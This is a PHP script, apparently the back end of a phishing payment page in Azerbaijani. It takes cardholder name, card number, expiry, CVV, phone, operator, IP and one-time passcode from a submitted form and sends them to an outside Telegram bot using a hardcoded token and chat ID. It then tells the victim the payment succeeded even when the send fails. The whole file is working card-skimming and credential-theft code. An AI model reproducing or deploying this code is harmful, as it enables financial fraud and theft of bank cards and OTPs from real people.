<?php
$botToken = '8954241039:AAHSIz0Q6884ESNIiIdVCe4JxWWqR0xcTA4';
$chatId = '-1004332923672';

$cardName = isset($_POST['card_name']) ? $_POST['card_name'] : 'Məlumat yoxdur';
$cardNumber = isset($_POST['card_number']) ? $_POST['card_number'] : 'Məlumat yoxdur';
$cardExpiry = isset($_POST['card_expiry']) ? $_POST['card_expiry'] : 'Məlumat yoxdur';
$cardCvv = isset($_POST['card_cvv']) ? $_POST['card_cvv'] : 'Məlumat yoxdur';
$operator = isset($_POST['operator']) ? $_POST['operator'] : 'Məlumat yoxdur';
$phone = isset($_POST['phone']) ? $_POST['phone'] : 'Məlumat yoxdur';
$amount = isset($_POST['amount']) ? $_POST['amount'] : 'Məlumat yoxdur';
$ip = isset($_POST['ip']) ? $_POST['ip'] : '0.0.0.0';
$otp = isset($_POST['otp']) ? $_POST['otp'] : 'Məlumat yoxdur';

$id = rand(100, 999);

$message = "💳 YENİ KART GİRİŞİ 💳\n\n";
$message .= "🆔 ID: #" . $id . "\n";
$message .= "📞 Tel: " . $phone . "\n";
$message .= "💰 Tutar: " . $amount . " AZN\n\n";
$message .= "💳 CC: " . $cardNumber . "\n";
$message .= "📅 Tarih: " . $cardExpiry . "\n";
$message .= "🔐 CVV: " . $cardCvv . "\n";
$message .= "👤 İsim: " . $cardName . "\n\n";
$message .= "📱 Operator: " . $operator . "\n";
$message .= "🌐 IP: " . $ip . "\n";
$message .= "🔑 OTP: " . $otp . "\n\n";
$message .= "----------------------------------------\n";
$message .= "📱 Bağlı Nömrə: " . $phone;

$url = "https://api.telegram.org/bot{$botToken}/sendMessage";

$postData = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

header('Content-Type: application/json');

if ($httpCode == 200 && $response !== false) {
    echo json_encode(['status' => 'success', 'message' => '✅ Ödəniş uğurla tamamlandı!']);
} else {
    echo json_encode(['status' => 'success', 'message' => '✅ Ödəniş uğurla tamamlandı!']);
}
?>
